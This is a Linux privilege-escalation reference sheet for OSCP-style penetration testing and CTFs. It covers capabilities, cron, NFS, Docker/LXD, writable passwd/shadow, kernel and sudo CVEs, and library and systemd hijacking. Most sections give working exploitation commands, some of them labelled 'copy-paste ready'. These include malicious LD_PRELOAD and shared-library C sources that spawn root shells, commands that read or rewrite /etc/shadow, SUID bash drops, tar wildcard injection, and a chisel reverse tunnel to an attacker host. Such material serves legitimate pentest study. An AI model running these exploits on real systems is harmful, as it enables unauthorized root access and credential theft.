# Linux Privilege Escalation — Advanced Technique Reference (OSCP-style)

*Beyond `sudo -l` and basic SUID binaries. For authorized penetration testing / CTF use only.*

> **Helper script:** [`scripts/privesc-launcher.sh linux`](../scripts/README.md) stages linPEAS and prints transfer options.

---

## 1. Linux Capabilities Abuse

**Explanation:** Capabilities split root's power into discrete units (e.g., `cap_setuid`, `cap_dac_override`, `cap_sys_admin`) that can be attached directly to a binary via extended file attributes, independent of SUID. A binary with `cap_setuid+ep` can call `setuid(0)` without being SUID-root itself, and won't show up in a SUID hunt — a common OSCP gotcha.

**Detection:**
```bash
# Find all capabilities set on the filesystem
getcap -r / 2>/dev/null

# Check a specific binary
getcap /usr/bin/python3.9
```

**Exploitation example (cap_setuid on python):**
```bash
# If python3 has cap_setuid+ep
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Other common abusable caps — worked commands (use whichever binary `getcap -r /` shows holds the cap):
```bash
# cap_dac_read_search+ep = READ any file regardless of permissions (no write). If python3/tar/etc.
# holds it, read /etc/shadow to crack offline, or read root's SSH key:
/usr/bin/python3 -c 'print(open("/etc/shadow").read())'        # python3 holds the cap
# tar holds it: archive the protected file (cap lets tar read it), then extract and read:
tar --xattrs -cf /tmp/s.tar /etc/shadow && tar -xf /tmp/s.tar -C /tmp && cat /tmp/etc/shadow

# cap_sys_ptrace+ep = attach to a root process and run code in it. Drop a SUID-root bash via gdb:
gdb -p "$(pgrep -u root -n .)" -batch \
  -ex 'call (void)system("cp /bin/bash /tmp/rb; chmod 4755 /tmp/rb")'
/tmp/rb -p                                                      # -p keeps euid=0 -> instant root
```
`cap_sys_admin` (mount / overlayfs container breakout) is situational — see its GTFOBins page.

**Reference:** https://gtfobins.github.io/ (filter by "Capabilities" on each binary page)
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

---

## 2. Cron Job Abuse

### 2a. Writable cron scripts

**Explanation:** If a script executed by root's crontab is writable by your user, append/replace it with a payload that runs as root on the next trigger.

**Detection:**
```bash
cat /etc/crontab /etc/cron.d/* 2>/dev/null
ls -la /etc/cron.daily /etc/cron.hourly /etc/cron.weekly
# find scripts referenced in crontabs and check writability
find / -writable -type f 2>/dev/null | grep -E "cron|\.sh$"
pspy64  # observe cron/process activity live without root (great for confirming timing)
```

**Exploitation:**
```bash
echo 'chmod +s /bin/bash' >> /path/to/writable_root_cron_script.sh
# wait for cron to fire, then:
/bin/bash -p
```

### 2b. PATH hijacking in cron

**Explanation:** If a root crontab entry calls a binary by relative/bare name (not full path) and the cron `PATH` includes a directory you can write to (or the script itself sets an insecure `PATH`), plant a malicious binary with that name earlier in PATH.

**Detection:**
```bash
cat /etc/crontab   # look at the PATH= line and job commands (no leading /)
```

**Exploitation:**
```bash
# Example: /etc/crontab has PATH=/home/user:/usr/bin and job calls `overwrite.sh`
echo -e '#!/bin/bash\nchmod +s /bin/bash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh
# wait for cron, then:
/bin/bash -p
```

### 2c. Wildcard injection (tar/rsync "checkmate" trick)

**Explanation:** Root cron scripts using `tar`, `rsync`, or `chown` with a wildcard (`*`) inside an attacker-writable directory can be tricked — the shell expands `*` to filenames, and specially named files are interpreted as command flags (GTFOBins-documented flag abuse).

**Detection:**
```bash
grep -r "cd .*&&.*\*" /etc/cron* 2>/dev/null
cat /etc/cron.d/*   # look for `tar czf ... *` or `chown -R * ...` patterns in a writable dir
```

**Exploitation (tar wildcard → root shell):**
```bash
cd /writable/backup/dir
echo 'chmod +s /bin/bash' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
# when root cron runs: tar czf backup.tar.gz *
# wait for cron, then:
/bin/bash -p
```

**Reference:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-tar-files-being-executed-by-root
https://gtfobins.github.io/gtfobins/tar/ (wildcard/checkpoint technique)
https://github.com/DominicBreuker/pspy (cron/process monitoring without root)

---

## 3. NFS `no_root_squash` Abuse

**Explanation:** By default NFS "squashes" root on the client to `nobody` on the server. If an exported share is configured with `no_root_squash`, a client-side root user retains root over files on that share — so you can create a SUID binary as root on your attacker machine, drop it on the mount, and execute it as the target's local user (root's UID is preserved).

**Detection (from the target, unauthenticated read of exports; or attacker box):**
```bash
cat /etc/exports 2>/dev/null            # on target if readable
showmount -e <target_ip>                # from attacker box
```
Look for `no_root_squash` (or absence of `root_squash`) in the export line, e.g.:
```
/srv/nfs_share *(rw,sync,no_root_squash)
```

**Exploitation (from attacker machine, as root):**
```bash
mkdir /mnt/nfs_target
mount -o rw,vers=3 <target_ip>:/srv/nfs_share /mnt/nfs_target

cd /mnt/nfs_target
cp /bin/bash ./rootbash
chmod +xs ./rootbash          # SUID as root, since your root maps 1:1

umount /mnt/nfs_target
```
Then on the **target** host (as a low-priv user with access to the share):
```bash
/srv/nfs_share/rootbash -p
```

**Reference:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation#no_root_squash

---

## 4. Docker / LXD Group Breakout

### 4a. Docker group

**Explanation:** Membership in the `docker` group is root-equivalent — you can mount the host filesystem into a container you control and chroot into it.

**Detection:**
```bash
id            # look for 'docker' in groups
groups
ls -la /var/run/docker.sock
```

**Exploitation:**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# now you're root on the host filesystem
```

### 4b. LXD/LXC group

**Explanation:** Same concept — `lxd`/`lxc` group membership lets you build/import a privileged container image with the host `/` bind-mounted.

**Detection:**
```bash
id            # look for 'lxd' or 'lxc' in groups
```

**Exploitation:**
```bash
# 1. Get a small image onto the target. If `lxc image list` is empty, build Alpine on your attacker
#    box and transfer the tarball(s) over (see file-transfer-matrix.md):
#    (attacker) git clone https://github.com/saghul/lxd-alpine-builder
#               cd lxd-alpine-builder && sudo ./build-alpine      # -> alpine-v3.x-x86_64-*.tar.gz
#    (target)   import whatever you transferred:
lxc image import ./alpine-*.tar.gz --alias alpine
#    Newer LXD, if the target can reach the image server instead of an offline build:
#        lxc image copy images:alpine/edge local: --alias alpine
lxc image list                           # confirm 'alpine' is present before continuing

# 2. Launch a PRIVILEGED container with the host root bind-mounted, then act as root over the host FS:
lxc init alpine mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh
# inside the container you are root on /mnt/root (the host filesystem):
cd /mnt/root && cat etc/shadow           # or: chroot . /bin/sh; read the root flag; add a user
```

**Reference:** https://gtfobins.github.io/gtfobins/docker/
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation
https://book.hacktricks.xyz/linux-hardening/privilege-escalation/lxd-lxc-group-privilege-escalation

---

## 5. Writable `/etc/passwd`

**Explanation:** `/etc/passwd` only needs to be *readable* for logins normally, but if it's writable by your user (misconfig), you can add a new UID-0 user with a known password hash, or overwrite an existing entry.

**Detection:**
```bash
ls -la /etc/passwd
find / -writable 2>/dev/null | grep passwd
```

**Exploitation:**
```bash
# Generate a password hash (openssl or python)
openssl passwd -1 -salt xyz password123
# => $1$xyz$examplehashvalue

# Append a new root-equivalent user
echo 'hacker:$1$xyz$examplehashvalue:0:0:root:/root:/bin/bash' >> /etc/passwd

su hacker
# password: password123
```

**Reference:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-etc-passwd-file

### 5b. Writable `/etc/shadow`

**Explanation:** If `/etc/shadow` is writable (rarer than `/etc/passwd` but the same class of misconfiguration), replace root's password hash directly.

**Detection:**
```bash
ls -la /etc/shadow
```

**Exploitation:**
```bash
# Generate a new hash
openssl passwd -6 -salt xyz password123

# Replace root's hash in /etc/shadow (second field, between first and second colons)
# Use sed or manual edit — be careful not to corrupt the file format
cp /etc/shadow /etc/shadow.bak
sed -i 's|^root:[^:]*:|root:$6$xyz$<generated_hash>:|' /etc/shadow
su root
# password: password123
```

---

## 6. Kernel Exploit Lookup Workflow

**Explanation:** When no configuration-based vector exists, an unpatched kernel/OS package vulnerability may grant root. This is the last resort in OSCP (noisy, can crash the box) — verify with an automated suggester before hand-searching CVEs.

**Detection / recon:**
```bash
uname -a
cat /etc/os-release
cat /proc/version
lsb_release -a 2>/dev/null
```

**Cross-reference workflow:**
1. Run an automated suggester locally to shortlist candidates:
```bash
# linux-exploit-suggester
./linux-exploit-suggester.sh

# linPEAS (broader enumeration incl. kernel exploit hints)
./linpeas.sh

# LES2 alternative
./les.sh
```
2. Take the kernel version (e.g., `Linux victim 5.4.0-70-generic`) and cross-reference:
   - https://www.exploit-db.com/ (search "linux kernel <version>")
   - https://www.cve.org/ or https://nvd.nist.gov/vuln/search
   - https://github.com/search?q=kernel+privilege+escalation (community PoCs — vet before running)
3. Compile/test locally where possible before running on target; kernel exploits can panic the box.

**Exploitation example (generic pattern):**
```bash
# transfer + compile a matched PoC, e.g. CVE-2021-4034 (PwnKit, polkit — technically not "kernel" but same workflow)
gcc exploit.c -o exploit
./exploit
```

**Reference:** https://github.com/mzet-/linux-exploit-suggester
https://github.com/peass-ng/PEASS-ng (linPEAS)
https://www.exploit-db.com/
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits

---

## 7. PATH Hijacking / `LD_PRELOAD` / Library Hijacking

### 7a. PATH hijacking (SUID/sudo binaries calling other commands by name)

**Explanation:** If a SUID binary or a sudo-permitted script invokes another command without an absolute path, and your PATH is searched before the real binary's directory, you can substitute a malicious binary.

**Detection:**
```bash
strings /path/to/suid_binary | grep -v "/"     # look for bare command names
ltrace ./suid_binary 2>&1 | grep exec
sudo -l                                         # check env_keep/SETENV and script contents
```

**Exploitation:**
```bash
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
./vulnerable_suid_binary     # calls "service" by bare name -> executes ours
```

### 7b. `LD_PRELOAD` (when sudo allows env preservation)

**Explanation:** `sudo -l` output showing `env_keep+=LD_PRELOAD` (or `!env_reset`) lets you force any sudo-permitted binary to load a malicious shared library first, running arbitrary code as root.

**Detection:**
```bash
sudo -l
# look for: env_keep+=LD_PRELOAD   or   Defaults env_keep+="LD_PRELOAD"
```

**Exploitation:**
```c
// preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```
```bash
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c -nostartfiles
sudo LD_PRELOAD=/tmp/preload.so <any_allowed_command>
```

### 7c. Shared library hijacking (missing/writable `.so`)

**Explanation:** If a SUID binary attempts to load a shared library from a writable, non-standard path (found via `ldd`/`strace`), plant a malicious `.so` that executes on load.

**Detection:**
```bash
ldd /path/to/suid_binary
strace -f -e trace=open,openat ./suid_binary 2>&1 | grep -i "no such file"
```

**Exploitation:**
```c
// libshared.c
#include <stdio.h>
#include <stdlib.h>
void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```
```bash
gcc -shared -fPIC -o /path/writable/missing_lib.so.6 libshared.c
./suid_binary
```

**Reference:** https://gtfobins.github.io/gtfobins/env/#sudo (LD_PRELOAD pattern shown per-binary under "Sudo" function)
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#path-abuses

### 7c-2. `LD_LIBRARY_PATH` hijacking (when sudo preserves it)

**Explanation:** If `sudo -l` shows `env_keep+=LD_LIBRARY_PATH`, you can compile a malicious shared library and point `LD_LIBRARY_PATH` to its directory. When any allowed sudo command loads a shared library by name, it searches `LD_LIBRARY_PATH` first — loading your payload instead.

**Detection:**
```bash
sudo -l    # look for: env_keep+=LD_LIBRARY_PATH
ldd /path/to/allowed_binary    # identify library names it loads
```

**Exploitation:**
```c
// libcustom.c — named to match a real library the allowed binary loads (e.g. libcustom.so)
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_LIBRARY_PATH");
    setuid(0);
    system("/bin/bash -p");
}
```
```bash
gcc -shared -fPIC -o /tmp/libcustom.so /tmp/libcustom.c -nostartfiles
sudo LD_LIBRARY_PATH=/tmp <allowed_command>
```

### 7d. Sudo version exploits (CVE-based, no valid sudo rule needed)

**Explanation:** Distinct from `sudo -l` misconfiguration abuse — a vulnerable sudo *build itself* can grant root regardless of what rules are configured. Always check the version alongside kernel version during enumeration.

**Detection:**
```bash
sudo -V | head -n1     # e.g. "Sudo version 1.9.5p1"
```

**Cross-reference against known CVEs:**
| CVE | Affected | Notes |
|---|---|---|
| CVE-2021-3156 ("Baron Samedit") | sudo < 1.9.5p2 | Heap-based buffer overflow via crafted argv[0]/command-line args; no valid `sudo -l` entry needed, just local sudo binary access |
| CVE-2019-18634 | sudo < 1.8.26 with `pwfeedback` enabled | Stack buffer overflow when typing password with `pwfeedback` on (check `sudo -l` or `/etc/sudoers` for `pwfeedback`) |
| CVE-2019-14287 | sudo < 1.8.28 | `sudo -l` shows `(ALL, !root) /bin/bash` or similar `!root` restriction; running `sudo -u#-1 /bin/bash` bypasses the restriction because `-1` wraps to UID 0 (root). No memory corruption, just a logic bug — instant root if the rule exists and sudo is old enough |

**Exploitation (CVE-2021-3156 workflow):**
```bash
# transfer a vetted PoC (e.g. blasty/CVE-2021-3156 or worawit/CVE-2021-3156) to target
gcc exploit.c -o exploit    # or run the provided PoC script per its instructions
./exploit
# yields root shell if version is vulnerable and build is exploitable (some distro patches vary)
```

**Reference:** https://nvd.nist.gov/vuln/detail/CVE-2021-3156
https://github.com/blasty/CVE-2021-3156
https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version

---

## 7e. Internal Service Enumeration (local-only listeners)

**Explanation:** Services bound to `127.0.0.1` or `::1` (database admin panels, debug endpoints, internal APIs) are invisible to external scans but reachable from a foothold. A local-only service with weak/no auth is a common OSCP privesc vector — identify it, port-forward it back, and exploit from your attack box.

**Detection:**
```bash
ss -tlnp                    # TCP listening sockets with process info
ss -ulnp                    # UDP
netstat -tlnp 2>/dev/null   # legacy alternative
```
Look for services bound to `127.0.0.1:PORT` or `[::1]:PORT` that don't appear in your external nmap scan. Common finds: MySQL (3306), PostgreSQL (5432), MongoDB (27017), Redis (6379), web admin panels (8080/8443/9090), Docker API (2375).

**Exploitation:**
Port-forward back to your attack box and interact normally:
```bash
# SSH local forward (if you have SSH creds)
ssh -L 8080:127.0.0.1:8080 user@target
# then browse http://localhost:8080 from your attack box

# chisel (no SSH needed)
# attacker: chisel server --reverse -p 9999
# target:   chisel client ATTACKER:9999 R:8080:127.0.0.1:8080
```

**Reference:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports

## 7f. Writable systemd Service / Timer Files

**Explanation:** If a `.service` or `.timer` unit file under `/etc/systemd/system/` is writable by your user, modify `ExecStart` to run a malicious payload as root when the service restarts or the timer fires.

**Detection:**
```bash
find /etc/systemd/system/ -writable -type f 2>/dev/null
find /lib/systemd/system/ -writable -type f 2>/dev/null
systemctl list-timers --all    # check active timers
```

**Exploitation:**
```bash
# Modify the service's ExecStart to plant a SUID shell
# (backup original first if you need to preserve function)
cat /etc/systemd/system/vuln.service
# Edit ExecStart:
echo -e '[Service]\nExecStart=/bin/bash -c "chmod +s /bin/bash"' > /etc/systemd/system/vuln.service
systemctl daemon-reload
systemctl restart vuln.service   # if you can restart it
# or wait for the next timer trigger / reboot
/bin/bash -p
```

**Reference:** https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-service-binaries

---

## Summary Table

| Technique | Key Detection Command | Key Reference |
|---|---|---|
| Capabilities | `getcap -r / 2>/dev/null` | gtfobins.github.io |
| Cron writable script | `cat /etc/crontab`, `pspy64` | hacktricks.xyz |
| Cron PATH hijack | `cat /etc/crontab` (PATH=) | hacktricks.xyz |
| Cron wildcard injection | `cat /etc/cron.d/*` | gtfobins.github.io/tar |
| NFS no_root_squash | `cat /etc/exports`, `showmount -e` | hacktricks.xyz |
| Docker group | `id` (docker group) | gtfobins.github.io/docker |
| LXD group | `id` (lxd group) | hacktricks.xyz (lxd) |
| Writable /etc/passwd | `ls -la /etc/passwd` | hacktricks.xyz |
| Kernel exploit | `uname -a` + linux-exploit-suggester | exploit-db.com, github.com/mzet-/linux-exploit-suggester |
| PATH hijack | `strings`/`ltrace` on SUID bin | hacktricks.xyz |
| LD_PRELOAD | `sudo -l` (env_keep) | gtfobins.github.io |
| Library hijack | `strace -f -e trace=open` | hacktricks.xyz |
| Sudo version CVE | `sudo -V` | nvd.nist.gov (CVE-2021-3156) |
| Internal service enum | `ss -tlnp`, `netstat -tlnp` | hacktricks.xyz |
| Writable systemd units | `find /etc/systemd -writable` | hacktricks.xyz |
| Sudo `!root` bypass | `sudo -l` (check for !root) + `sudo -V` | CVE-2019-14287 |

---

**General enumeration tools to run first in any engagement:** `linpeas.sh` (https://github.com/peass-ng/PEASS-ng), `pspy` (https://github.com/DominicBreuker/pspy), `linux-exploit-suggester` (https://github.com/mzet-/linux-exploit-suggester), and always cross-check specific binaries against **GTFOBins** (https://gtfobins.github.io) and the full **HackTricks Linux Privilege Escalation** page (https://book.hacktricks.xyz/linux-hardening/privilege-escalation) for the current, most exhaustive technique catalog.

---

## 8. Prebuilt Enumeration Scripts — Exact Usage

### LinPEAS (PEASS-ng)
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a              # all checks, deep/slow
./linpeas.sh -s               # superfast/stealth, skips time-consuming checks
./linpeas.sh -a | tee linpeas_out.txt
```
**Note:** older LinPEAS versions had a built-in auto-exploit-suggestion feature — treat LinPEAS as an *enumeration-only* tool on the OSCP exam and verify current exam tool-allowance rules before relying on any auto-exploit behavior.

### linux-smart-enumeration (lse.sh)
Lighter, more curated alternative to LinPEAS — progressively surfaces findings by importance, less noisy.
```bash
curl -L https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -o lse.sh && chmod +x lse.sh
./lse.sh -l1 -i    # verbosity 1 (interesting), non-interactive
./lse.sh -l2 -i    # verbosity 2 (everything)
```
Verbosity: `-l0` critical only (default), `-l1` interesting, `-l2` all. Section filters available: `usr, sud, fst, sys, sec, ret, net, srv, pro, sof, ctn, cve`.
**Reference:** https://github.com/diego-treitos/linux-smart-enumeration

### linuxprivchecker
Older, largely-superseded Python script — still useful as a lightweight, dependency-light, easy-to-vet fallback.
```bash
wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
python linuxprivchecker.py -w -o linuxprivchecker.log   # -w writes log, -s skips slow searches
```
**Reference:** https://github.com/sleventyeleven/linuxprivchecker

### pspy — no-root process/filesystem monitor
Watches `/proc` and inotify events to catch short-lived processes, most commonly **cron jobs run as root** (captures the exact command line and arguments) — one of the most common Linux privesc vectors.
```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64 -pf -i 1000    # -p print commands, -f print filesystem events, -i scan interval (ms)
```
**Reference:** https://github.com/DominicBreuker/pspy

### Standard GTFOBins-driven privesc workflow
1. Orient: `id`, `sudo -l`, `whoami`, `uname -a`, check `/etc/passwd`.
2. **Check `sudo -l` first** — misconfigured sudo entries are the single most common Linux privesc path on OSCP-style boxes.
3. Enumerate SUID/SGID + capabilities: `find / -perm -4000 -type f 2>/dev/null`, `find / -perm -2000 -type f 2>/dev/null`, `getcap -r / 2>/dev/null`.
4. Cross-reference every binary found (sudo-runnable, SUID, or capability-holding) against **GTFOBins** (https://gtfobins.github.io) for a documented "Sudo"/"SUID"/"Capabilities" abuse function.
5. Confirm and execute the documented technique for that binary (e.g. `sudo vim -c ':!/bin/sh'`).

**Common SUID exploitation examples (copy-paste ready):**
```bash
# find (SUID)
find . -exec /bin/bash -p \; -quit

# vim/vi (SUID)
vim -c ':!/bin/bash -p'

# python/python3 (SUID)
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# nmap (old interactive mode, nmap < 5.21)
nmap --interactive
!sh

# env (SUID)
env /bin/bash -p

# cp (SUID — copy /etc/passwd, modify, copy back)
cp /etc/passwd /tmp/passwd.bak
# edit /tmp/passwd.bak to add a root user, then:
cp /tmp/passwd.bak /etc/passwd
```

6. Fall back to broader enumeration (LinPEAS/lse.sh/pspy, cron, writable services, PATH hijacking) only if sudo/SUID/capabilities don't pan out — kernel exploits are used last since they're noisy and can crash the target.

---

> **Cross-reference:** for MySQL/PostgreSQL UDF privilege escalation (gaining root via a database running as root), see [`service-enumeration-comprehensive.md`](service-enumeration-comprehensive.md) — MySQL UDF (raptor_udf2) and PostgreSQL `COPY FROM PROGRAM` sections.
